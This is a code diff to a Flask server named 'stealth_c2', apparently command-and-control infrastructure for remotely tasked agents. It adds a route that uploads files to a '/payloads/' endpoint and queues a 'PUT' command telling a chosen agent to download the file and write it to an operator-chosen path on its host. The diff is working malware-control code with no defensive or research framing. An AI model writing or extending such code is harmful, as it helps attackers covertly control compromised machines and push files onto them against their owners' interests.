@@ -1,9 +1,11 @@
 # stealth_c2/c2_server.py
 
-from flask import Flask, request, render_template, redirect, url_for, flash, Response, jsonify
+from flask import Flask, request, render_template, redirect, url_for, flash, Response, jsonify, send_from_directory
 from datetime import datetime, timedelta
 import json
 import queue
+import os
+import secrets
 
 app = Flask(__name__)
 app.secret_key = "dev-secret-key"  # for flash messages; replace in prod
@@ -11,6 +13,8 @@ agent_tasks = {}
 agent_responses = {}
 agent_last_seen = {}
 _event_subscribers = set()
+UPLOAD_DIR = os.path.join(os.path.dirname(__file__), "uploads")
+os.makedirs(UPLOAD_DIR, exist_ok=True)
 
 
 def _publish_event(event):
@@ -71,6 +75,39 @@ def dashboard():
         responses=agent_responses,
         active_agents=active_agents,
     )
+
+
+# -------- File Uploads for Agents --------
+@app.route("/admin/upload", methods=["POST"])
+def admin_upload():
+    agent_id = request.form.get("agent_id", "").strip()
+    dest_path = request.form.get("dest_path", "").strip()
+    f = request.files.get("file")
+    if not agent_id or not dest_path or not f or f.filename == "":
+        flash("Agent, destination path, and file are required", "error")
+        return redirect(url_for("dashboard"))
+
+    # Save with a random prefix to avoid collisions
+    safe_name = f.filename.replace("\\", "_").replace("/", "_")
+    token = secrets.token_hex(4)
+    saved_name = f"{token}_{safe_name}"
+    save_path = os.path.join(UPLOAD_DIR, saved_name)
+    f.save(save_path)
+
+    # Build absolute URL for the agent to fetch
+    base = request.host_url.rstrip("/")
+    url = f"{base}/payloads/{saved_name}"
+
+    # Queue PUT command for agent
+    agent_tasks[agent_id] = f"PUT {url} {dest_path}"
+    flash(f"Uploaded {safe_name} and queued transfer to {agent_id}", "success")
+    _publish_event({"type": "upload", "agent_id": agent_id})
+    return redirect(url_for("dashboard"))
+
+
+@app.route("/payloads/<path:filename>")
+def payloads(filename):
+    return send_from_directory(UPLOAD_DIR, filename, as_attachment=False)
 
 
 @app.route("/admin/data", methods=["GET"])  # JSON snapshot for live refresh
